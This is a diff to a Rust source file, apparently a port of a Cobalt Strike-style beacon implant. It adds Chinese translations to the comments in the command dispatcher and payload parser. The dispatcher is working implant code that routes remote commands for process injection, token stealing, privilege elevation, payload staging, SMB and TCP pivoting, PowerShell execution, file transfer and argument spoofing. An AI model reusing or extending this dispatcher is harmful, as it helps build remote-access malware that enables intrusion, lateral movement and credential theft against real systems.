@@ -1,3 +1,4 @@
+//! 命令分发（proto.cpp）。
 //! Command dispatch (proto.cpp).
 
 use crate::callback::command_shell_callback;
@@ -144,11 +145,11 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
     match rtype {
         COMMAND_SPAWN => command_inject(buffer, length, true, true),
         COMMAND_INJECT_PID => command_inject_pid(buffer, length, true),
-        COMMAND_SHELL => {} // deprecated
+        COMMAND_SHELL => {} // 已弃用 / deprecated
         COMMAND_DIE => command_die(command_shell_callback),
         COMMAND_SLEEP => command_sleep(buffer, length),
         COMMAND_CD => command_cd(buffer, length),
-        COMMAND_KEYLOG_START | COMMAND_KEYLOG_STOP => {} // deprecated
+        COMMAND_KEYLOG_START | COMMAND_KEYLOG_STOP => {} // 已弃用 / deprecated
         COMMAND_UPLOAD => command_upload(buffer, length, b"wb"),
         COMMAND_DOWNLOAD => command_download(buffer, length, command_shell_callback),
         COMMAND_EXECUTE => command_execute(buffer, length),
@@ -159,17 +160,17 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
         COMMAND_LISTEN => command_listen(buffer, length, command_shell_callback),
         COMMAND_INJECT_PING => command_inject_ping(buffer, length, true, command_shell_callback),
         COMMAND_DOWNLOAD_STOP => command_download_stop(buffer, length),
-        COMMAND_CHANNEL_SMB | COMMAND_PIPE_OPEN => {} // deprecated
+        COMMAND_CHANNEL_SMB | COMMAND_PIPE_OPEN => {} // 已弃用 / deprecated
         COMMAND_PIPE_ROUTE => command_link_route(buffer, length, command_shell_callback),
         COMMAND_PIPE_CLOSE => command_link_stop(buffer, length, command_shell_callback),
         COMMAND_PIPE_REOPEN => command_link_reopen(buffer, length, command_shell_callback),
         COMMAND_TOKEN_GETUID => command_getuid(buffer, length, command_shell_callback),
         COMMAND_TOKEN_REV2SELF => command_rev2self(),
         COMMAND_STEAL_TOKEN => command_steal_token(buffer, length, command_shell_callback),
-        COMMAND_GETSYSTEM | COMMAND_BYPASSUAC | COMMAND_TIMESTOMP => {} // deprecated
+        COMMAND_GETSYSTEM | COMMAND_BYPASSUAC | COMMAND_TIMESTOMP => {} // 已弃用 / deprecated
         COMMAND_PS_LIST => command_ps_list(buffer, length, command_shell_callback),
         COMMAND_PS_KILL => command_ps_kill(buffer, length),
-        COMMAND_KERB_TKT_USE | COMMAND_KERB_TKT_PURGE | COMMAND_PSH_RUN => {} // deprecated
+        COMMAND_KERB_TKT_USE | COMMAND_KERB_TKT_PURGE | COMMAND_PSH_RUN => {} // 已弃用 / deprecated
         COMMAND_PSH_IMPORT => command_psh_import(buffer, length),
         COMMAND_RUNAS => command_runas(buffer, length, command_shell_callback),
         COMMAND_PWD => command_pwd(command_shell_callback),
@@ -181,9 +182,9 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
         COMMAND_INJECT_PID_PING => command_inject_pid_ping(buffer, length, command_shell_callback, true),
         COMMAND_INJECTX64_PID_PING => command_inject_pid_ping(buffer, length, command_shell_callback, false),
         COMMAND_PAUSE => command_pause(buffer, length),
-        COMMAND_IPCONFIG => {} // deprecated 4.2
+        COMMAND_IPCONFIG => {} // 自 4.2 起已弃用 / deprecated 4.2
         COMMAND_LOGINUSER => command_loginuser(buffer, length, command_shell_callback),
-        COMMAND_LSOCKET_BIND => command_socket_bind(buffer, length, 0), // INADDR_ANY
+        COMMAND_LSOCKET_BIND => command_socket_bind(buffer, length, 0), // INADDR_ANY：绑定任意本地地址 / INADDR_ANY: bind to any local address
         COMMAND_LSOCKET_CLOSE => command_socket_close(buffer, length),
         COMMAND_STAGE_PAYLOAD => command_stage_payload(buffer, length),
         COMMAND_FILE_LIST => command_file_list(buffer, length, command_shell_callback),
@@ -191,13 +192,13 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
         COMMAND_FILE_DRIVES => command_file_drives(buffer, length, command_shell_callback),
         COMMAND_FILE_RM => command_file_delete(buffer, length),
         COMMAND_STAGE_PAYLOAD_SMB => command_stage_payload_smb(buffer, length),
-        COMMAND_PSEXEC_COMMAND => {} // deprecated 4.1
+        COMMAND_PSEXEC_COMMAND => {} // 自 4.1 起已弃用 / deprecated 4.1
         COMMAND_WEBSERVER_LOCAL => command_webserver_local(buffer, length),
         COMMAND_ELEVATE_PRE => command_elevate_pre(buffer, length),
         COMMAND_ELEVATE_POST => command_elevate_post(command_shell_callback),
         COMMAND_JOB_REGISTER_IMPERSONATE => command_job_register(buffer, length, true, JOB_MODE_BYTE),
         COMMAND_SPAWN_POWERSHELLX86 | COMMAND_SPAWN_POWERSHELLX64
-        | COMMAND_INJECT_POWERSHELLX86_PID | COMMAND_INJECT_POWERSHELLX64_PID => {} // deprecated
+        | COMMAND_INJECT_POWERSHELLX86_PID | COMMAND_INJECT_POWERSHELLX64_PID => {} // 已弃用 / deprecated
         COMMAND_UPLOAD_CONTINUE => command_upload(buffer, length, b"ab"),
         COMMAND_PIPE_OPEN_EXPLICIT => command_link_start_explicit(buffer, length, command_shell_callback),
         COMMAND_SPAWN_PROC_X64 => command_spawnproc(buffer, length, false),
@@ -211,7 +212,7 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
         COMMAND_GETPRIVS => command_getprivs(buffer, length, command_shell_callback),
         COMMAND_EXECUTE_JOB => command_execjob(buffer, length),
         COMMAND_PSH_HOST_TCP => command_psh_host_tcp(buffer, length),
-        COMMAND_DLL_LOAD | COMMAND_REG_QUERY => {} // deprecated 4.1
+        COMMAND_DLL_LOAD | COMMAND_REG_QUERY => {} // 自 4.1 起已弃用 / deprecated 4.1
         COMMAND_LSOCKET_TCPPIVOT => command_socket_tcppivot(buffer, length),
         COMMAND_ARGUE_ADD => command_argue_add(buffer, length),
         COMMAND_ARGUE_REMOVE => command_argue_remove(buffer, length),
@@ -225,7 +226,7 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
         COMMAND_BLOCKDLLS => command_blockdlls(buffer, length),
         COMMAND_SPAWNAS_X86 => command_spawnas(buffer, length, true),
         COMMAND_SPAWNAS_X64 => command_spawnas(buffer, length, false),
-        COMMAND_INLINE_EXECUTE | COMMAND_ELEVATE_RUN_INJ_X86 | COMMAND_ELEVATE_RUN_INJ_X64 => {} // deprecated
+        COMMAND_INLINE_EXECUTE | COMMAND_ELEVATE_RUN_INJ_X86 | COMMAND_ELEVATE_RUN_INJ_X64 => {} // 已弃用 / deprecated
         COMMAND_SPAWNU_X86 => command_spawnu(buffer, length, true),
         COMMAND_SPAWNU_X64 => command_spawnu(buffer, length, false),
         COMMAND_INLINE_EXECUTE_OBJECT => command_inline_execute_object(buffer, length),
@@ -235,6 +236,7 @@ pub fn process_message(rtype: u32, buffer: &[u8], length: usize) {
     }
 }
 
+/// 处理缓冲区：提取长度、类型和值。
 /// Process through the buffer: extract the length, type, and value.
 pub fn process_payload(buffer: &mut [u8], length: usize) {
     let mut pos = 0usize;
@@ -245,18 +247,22 @@ pub fn process_payload(buffer: &mut [u8], length: usize) {
         let rtype = u32::from_be_bytes([buffer[pos], buffer[pos + 1], buffer[pos + 2], buffer[pos + 3]]);
         let size = u32::from_be_bytes([buffer[pos + 4], buffer[pos + 5], buffer[pos + 6], buffer[pos + 7]]);
 
+        // 校验我们的数据
         // sanity check our data
         if (pos + size as usize + 8) > length {
             return;
         }
 
+        // 处理我们的消息
         // process our message
         process_message(rtype, &buffer[pos + 8..pos + 8 + size as usize], size as usize);
 
+        // 请继续下一条消息
         // on to the next message please
         pos += size as usize + 8;
     }
 
+    // 清理刚刚处理过的数据
     // cleanup the data we just processed
     buffer[..length].fill(0);
 }
